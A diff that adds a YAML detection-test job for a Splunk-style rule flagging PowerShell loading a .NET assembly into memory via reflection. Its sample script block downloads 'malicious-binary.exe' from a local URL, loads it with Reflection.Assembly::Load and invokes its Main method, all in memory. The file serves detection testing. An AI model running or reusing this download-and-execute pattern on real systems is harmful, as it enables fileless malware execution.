@@ -1,0 +1,45 @@
+type: job
+name: PowerShell Loading DotNET into Memory via Reflection
+detection:
+  source: escu
+  name: "ESCU - PowerShell Loading DotNET into Memory via Reflection - Rule"
+  id: 85bc3f30-ca28-11eb-bd21-acde48001122
+description: |
+  Validates detection of PowerShell loading a .NET assembly into memory via
+  reflection: PowerShell/Operational EID 4104 (Script Block Logging) records
+  a block, read from a script file and logged at Warning level, that passes
+  the content of an Invoke-WebRequest download, for example from a local
+  URL, to [System.Reflection.Assembly]::Load, then looks up a static Main
+  method in the loaded assembly and calls Invoke on it.
+
+mitre:
+  tactics: [execution]
+  techniques: [T1059.001]
+
+state:
+  domain_short:       CORP
+  domain_tld:         local
+  domain_short_lower: fn.lower(ref.domain_short)
+  domain_fqdn:        "${ref.domain_short_lower}.${ref.domain_tld}"
+  computer:           gen.hostname(class=windows-server, domain=ref.domain_fqdn)
+  level:              3
+
+workloads:
+  - scenario: scenarios/windows/powershell/script-block/script-block-logged
+    bindings:
+      domain_short:      ref.domain_short
+      domain_tld:        ref.domain_tld
+      computer:          ref.computer
+      level:             ref.level
+      script_path:       "C:\\Users\\Administrator\\Downloads\\reflection-assembly.ps1"
+      script_block_text: |-
+        $assembly = [System.Reflection.Assembly]::Load((Invoke-WebRequest 'http://127.0.0.1/malicious-binary.exe' -UseBasicParsing).Content)
+        $null = $assembly.GetTypes()
+        $method = $assembly.GetType('MaliciousProgram').GetMethod('Main', [System.Reflection.BindingFlags]'Static, Public, NonPublic')
+        $null = $method.Invoke($null, @())
+    expectation:
+      expected: alert
+      summary: "PowerShell loads a downloaded assembly with Reflection.Assembly::Load"
+      mitre:
+        tactics: [execution]
+        techniques: [T1059.001]
